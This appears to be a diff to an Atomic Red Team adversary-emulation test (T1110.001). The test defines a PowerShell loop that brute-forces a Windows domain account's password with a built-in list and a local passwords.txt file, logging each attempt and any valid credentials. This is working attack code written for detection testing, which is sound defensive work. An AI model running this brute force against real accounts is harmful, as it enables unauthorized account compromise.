@@ -9,13 +9,13 @@ atomic_tests:
   - windows
   input_arguments:
     user:
-        description: Account to bruteforce
-        type: String
-        default: Victim
-    passwords:
-      description: Path to a file containing a list of passwords we will attempt to brute force with
+      description: Account to bruteforce
       type: String
-      default: Pa`$`$w0rd`n123456`npassword
+      default: Victim
+    passwords:
+      description: list of passwords we will attempt to brute force with
+      type: String
+      default: 
     domain:
       description: Domain name of the target system we will brute force upon
       type: String
@@ -29,8 +29,15 @@ atomic_tests:
     command: |
       $passwords = "#{passwords}".split("`n")
       foreach ($password in $passwords){
+        "[-] Attempting $password on account #{user}." | Out-File -FilePath #{output_file} -Append
         if ((new-object directoryservices.directoryentry "",#{user},$password).psbase.name -ne $null) {
-          "[!] #{user}:$password found on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
+          "[!] #{user}:$password are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
+        }
+      }
+      foreach ($password in Get-Content 'C:\AtomicRedTeam\atomics\T1110.001\passwords.txt' ) {
+        "[-] Attempting $password on account #{user}." | Out-File -FilePath #{output_file} -Append
+        if ((new-object directoryservices.directoryentry "",#{user},$password).psbase.name -ne $null) {
+          "[!] #{user}:$password are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
         }
       }
       "End of bruteforce" | Out-File -FilePath #{output_file} -Append
